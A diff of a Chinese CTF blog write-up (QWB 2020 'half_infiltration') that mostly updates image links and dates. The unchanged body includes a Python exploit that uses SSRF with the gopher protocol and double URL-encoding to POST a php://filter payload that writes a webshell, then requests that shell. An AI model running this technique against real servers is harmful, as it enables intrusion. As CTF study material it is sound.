@@ -27,13 +27,13 @@
 <meta property="og:url" content="http://www.ch4ser.top/2020/08/27/qwb2020-web-1/index.html">
 <meta property="og:site_name" content="ch4ser||自闭室">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://ch4ser.top/20200827204917.png">
-<meta property="og:image" content="http://ch4ser.top/20200827231407.png">
+<meta property="og:image" content="http://www.ch4ser.top/images/qwb2020-web-1/image-20211114141959846.png">
+<meta property="og:image" content="http://www.ch4ser.top/images/qwb2020-web-1/image-20211114142011268.png">
 <meta property="article:published_time" content="2020-08-27T12:48:12.000Z">
-<meta property="article:modified_time" content="2021-10-16T06:20:26.965Z">
+<meta property="article:modified_time" content="2021-11-14T06:20:11.310Z">
 <meta property="article:author" content="ch4ser">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://ch4ser.top/20200827204917.png">
+<meta name="twitter:image" content="http://www.ch4ser.top/images/qwb2020-web-1/image-20211114141959846.png">
 
 <link rel="canonical" href="http://www.ch4ser.top/2020/08/27/qwb2020-web-1/">
 
@@ -190,7 +190,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-10-16 14:20:26" itemprop="dateModified" datetime="2021-10-16T14:20:26+08:00">2021-10-16</time>
+                <time title="Modified: 2021-11-14 14:20:11" itemprop="dateModified" datetime="2021-11-14T14:20:11+08:00">2021-11-14</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -213,7 +213,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p><img src="http://ch4ser.top/20200827204917.png"></p>
+        <p><img src="/images/qwb2020-web-1/image-20211114141959846.png" alt="image-20211114141959846"></p>
 <span id="more"></span>
 
 <h2 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h2><p>开局的页面如下</p>
@@ -239,7 +239,7 @@
 <p>可以访问, 那么这里应该是上传东西到目录下面了.这里使用gopher协议来发送post上传文件, 这里依然会有一个过滤, 包括等号在内的几种符号和字母组合都被过滤了,使用二次编码协议来绕过. </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse import urlencode, quote_plus, quote</span><br><span class="line"></span><br><span class="line">url0 = <span class="string">&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_&quot;</span></span><br><span class="line"></span><br><span class="line">upload_data = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;UEQ4OVlHTmhkQ0F2Wm14aFoyQTc&#x27;</span> <span class="comment"># 似乎可以正常解密的base64都无法写入文件中</span></span><br><span class="line">&#125;</span><br><span class="line">upload_data = urlencode(upload_data, quote_via=quote_plus)</span><br><span class="line"><span class="keyword">print</span>(upload_data)</span><br><span class="line"></span><br><span class="line">gopher_content = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:40000</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=hhhhhhhhhhhhhhhhhhhhhhhaaa;</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;length&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;data&#125;&#x27;</span><span class="string">&#x27;&#x27;</span>.format(length = len(upload_data), data=upload_data).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  ssrf need double url encode</span></span><br><span class="line">url = url0 + quote(quote(gopher_content))</span><br><span class="line"></span><br><span class="line">header = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    requests.get(url, headers=header)</span><br><span class="line"></span><br><span class="line">validate = <span class="string">&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/hhhhhhhhhhhhhhhhhhhhhhhaaa/shell.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">res = requests.get(validate)</span></span><br><span class="line"><span class="string">print(res.content)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="http://ch4ser.top/20200827231407.png"></p>
+<p><img src="/images/qwb2020-web-1/image-20211114142011268.png" alt="image-20211114142011268"></p>
 
     </div>
 
